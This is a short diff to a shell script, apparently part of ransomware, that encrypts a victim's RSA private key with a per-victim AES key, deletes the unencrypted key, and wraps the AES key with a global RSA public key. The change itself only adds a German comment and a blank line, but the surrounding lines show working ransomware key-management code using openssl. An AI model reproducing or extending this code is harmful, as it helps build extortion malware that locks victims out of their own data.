@@ -166,7 +166,9 @@ echo -n "$AES_VICTIM_KEY" > aes_victim_key.tmp
 
 openssl enc -aes-256-cbc -in rsa_victim_key_private.key -K "$AES_VICTIM_KEY" -iv 00000000000000000000000000000000 -out rsa_victim_key_private.enc 2>/dev/null
 
+# rsa_victim_key_private löschen
 rm -f rsa_victim_key_private.key
+
 # Step 4
 # Encrypt AES_VICTIM_KEY with RSA_GLOBAL_KEY_PUBLIC
 openssl pkeyutl -encrypt -pubin -inkey <(echo "$RSA_GLOBAL_KEY_PUBLIC") -in aes_victim_key.tmp -out aes_victim_key.enc 2>/dev/null
